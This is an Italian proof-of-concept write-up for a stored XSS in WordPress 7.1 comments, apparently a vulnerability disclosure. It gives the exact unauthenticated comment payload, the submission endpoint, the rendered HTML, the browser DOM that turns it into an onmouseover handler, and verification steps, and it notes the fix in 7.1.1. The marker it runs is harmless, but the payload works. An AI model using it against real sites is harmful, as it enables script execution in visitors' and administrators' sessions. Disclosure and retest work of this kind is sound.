# Proof of Concept minima

## Obiettivo

Questa PoC dimostra esclusivamente l'esecuzione di JavaScript attraverso la Stored XSS.

Non esegue azioni privilegiate e non modifica utenti, configurazioni o contenuti del sito.

Il marker utilizzato è:

    window.__WPXSS = 1337

## Ambiente verificato

- WordPress 7.1
- Twenty Twenty-Five 1.5
- commenti abilitati
- attaccante non autenticato
- browser Chromium

## Payload minimo

Inviare come contenuto del commento:

    <blockquote cite="http://example.com/A
    B">Q</blockquote><a title="onmouseover=window.__WPXSS=1337//">S</a>

La newline tra `A` e `B` è significativa e deve essere preservata.

## Invio

Il commento può essere inviato attraverso il normale form dei commenti oppure tramite:

    POST /wp-comments-post.php

Non è necessario un account WordPress per l'attaccante.

## Valore memorizzato

Nel test originale il contenuto sopravviveva al percorso di sanitizzazione e veniva memorizzato in una forma equivalente a:

    <blockquote cite="http://example.com/A
    B">Q</blockquote><a title="onmouseover=window.__WPXSS=1337//" rel="nofollow ugc">S</a>

## Approvazione

Se il commento richiede moderazione:

1. autenticarsi come Administrator;
2. aprire `/wp-admin/edit-comments.php`;
3. approvare il commento;
4. visitare il post contenente il commento.

Nel test originale il JavaScript non veniva eseguito nella pagina di moderazione.

## HTML trasformato

Durante il rendering, WordPress 7.1 produceva una struttura equivalente a:

    <blockquote cite="http://example.com/A
    <p> B&#8221;>Q</p></blockquote>
    <p><a title="onmouseover=window.__WPXSS=1337//" rel="nofollow ugc">S</a></p>

Questa rappresentazione era diversa dall'HTML originariamente sanitizzato.

## DOM osservato in Chromium

Chromium reinterpretava la struttura e materializzava un vero attributo evento sul `<blockquote>`:

    <blockquote
      cite="..."
      onmouseover="window.__WPXSS=1337//&quot;"
      rel="nofollow ugc">

## Verifica

Prima di attivare l'evento, aprire la console del browser ed eseguire:

    window.__WPXSS

Il risultato atteso è:

    undefined

Spostare quindi il mouse sul commento interessato.

Ripetere:

    window.__WPXSS

Il risultato atteso su WordPress 7.1 vulnerabile è:

    1337

Questo conferma l'esecuzione di JavaScript nell'origine WordPress.

## WordPress 7.1.1

La stessa PoC non risulta più sfruttabile su WordPress 7.1.1.

Nel retest:

- Chromium non materializza `onmouseover`;
- `window.__WPXSS` rimane `undefined`;
- non viene eseguito JavaScript.

La correzione impedisce quindi il breakout del contesto dell'attributo utilizzato dalla PoC originale.

## Nota di sicurezza

Questa PoC utilizza intenzionalmente un marker innocuo.

La vulnerabilità originale consentiva l'esecuzione di JavaScript nella sessione di un utente autenticato, ma non è necessario eseguire azioni privilegiate per verificare la presenza della vulnerabilità.
